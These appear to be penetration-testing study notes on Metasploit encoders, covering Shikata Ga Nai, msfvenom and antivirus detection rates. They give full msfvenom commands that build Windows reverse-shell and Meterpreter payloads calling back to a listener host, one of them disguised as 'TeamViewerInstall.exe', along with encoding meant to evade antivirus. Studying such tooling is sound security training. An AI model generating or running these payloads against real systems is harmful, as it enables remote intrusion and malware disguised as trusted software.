

## Purpose of Encoders

- Make payloads **compatible** with different architectures: `x64`, `x86`, `sparc`, `ppc`, `mips`.
    
- Remove **bad characters** (e.g., `\x00`).
    
- Historically used to **evade antivirus detection** (less effective today).
    

---

## AV Evasion History

- **Shikata Ga Nai (SGN)**
    
    - XOR-based polymorphic encoder.
        
    - Name means "It cannot be helped".
        
    - Previously dominant for AV evasion.
        
    - Modern AV easily detects SGN → **not reliable anymore**.
        

---

## Legacy vs Modern Tools

**Pre-2015 (Legacy):**

```
msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | \
msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
```

**Modern (msfvenom):**

- Combines `msfpayload` and `msfencode`.
    

**Without encoder:**

```
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp \
LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
```

**With encoder:**

```
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp \
LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

---

## Selecting Encoders in Metasploit

```
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > show encoders
```

**Example output:**

```
0  generic/eicar
1  generic/none
2  x64/xor
3  x64/xor_dynamic
4  x64/zutto_dekiru
```

---

## Architecture-Based Filtering

- Encoders available depend on the **payload architecture**.
    
- Example with older exploits (e.g., MS09-050):
    
    - Lists more x86 options: `x86/shikata_ga_nai`, `x86/alpha_upper`, etc.
        

---

## Real-World Encoding Impact

**Single SGN iteration:**

```
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o TeamViewerInstall.exe
```

- VirusTotal: **54/69 detections** → Poor evasion.
    

---

## Multi-Iteration Encoding

```
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -i 10 -f exe -o TeamViewerInstall.exe
```

- Payload size: ~611 bytes
    
- VirusTotal: **52/65 detections** → Slight improvement but still ineffective.
    

---

## VirusTotal API Integration

**Command:**

```
msf-virustotal -k <API_KEY> -f TeamViewerInstall.exe
```

- Requires **VirusTotal API key**.
    
- Useful for quick detection checks.
    

---

## Summary

|Feature|Description|
|---|---|
|**Purpose**|Compatibility and (formerly) AV evasion|
|**Legacy Tools**|`msfpayload` + `msfencode` (deprecated)|
|**Modern Tool**|`msfvenom` (current standard)|
|**Common Encoder**|`x86/shikata_ga_nai` (polymorphic XOR)|
|**Effectiveness**|Limited AV evasion with modern defenses|
|**Extra**|Use `-i` for multiple iterations; slight improvement only|